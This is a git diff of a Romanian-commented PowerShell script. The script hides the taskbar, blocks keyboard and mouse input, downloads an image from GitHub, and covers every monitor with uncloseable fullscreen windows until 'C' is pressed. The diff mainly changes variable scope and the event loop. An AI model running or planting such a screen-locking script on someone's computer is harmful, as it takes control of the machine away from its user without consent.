@@ -1,7 +1,6 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# Cod pentru input și taskbar
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -15,24 +14,18 @@ public class Native {
 }
 "@
 
-# Ascunde Taskbar
 $taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
 [Native]::ShowWindow($taskbar, 0)
-
-# Blochează input
 [Native]::BlockInput($true)
 
-# Descarcă poza
 $temp = "$env:TEMP\poza_laptop.jpg"
 Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing
 
-# Variabilă de control globală
-$script:inchis = $false
+$global:inchis = $false
 $forms = @()
 
-# Funcție care închide tot
 function InchideTot {
-    $script:inchis = $true
+    $global:inchis = $true
     [Native]::BlockInput($false)
     [Native]::ShowWindow($taskbar, 1)
     foreach ($f in $forms) {
@@ -40,7 +33,7 @@ function InchideTot {
     }
 }
 
-# Creează ferestre pe TOATE monitoarele
+# creare ferestre pt toate monitoarele
 foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form = New-Object Windows.Forms.Form
     $form.StartPosition = 'Manual'
@@ -60,18 +53,21 @@ foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form.Controls.Add($pic)
 
     $form.Add_KeyDown({
-        if ($_.KeyCode -eq 'C') { InchideTot }
+        if ($_.KeyCode -eq 'C') {
+            InchideTot
+        }
     })
 
     $form.Add_FormClosing({
-        if (-not $script:inchis) { $_.Cancel = $true }
+        if (-not $global:inchis) { $_.Cancel = $true }
     })
 
     $null = $form.Show()
     $forms += $form
 }
 
-# Buclă până se apasă C
-while (-not $script:inchis) {
-    Start-Sleep -Milliseconds 200
+# buclă principală până ce se apasă C
+while (-not $global:inchis) {
+    [System.Windows.Forms.Application]::DoEvents()
+    Start-Sleep -Milliseconds 100
 }
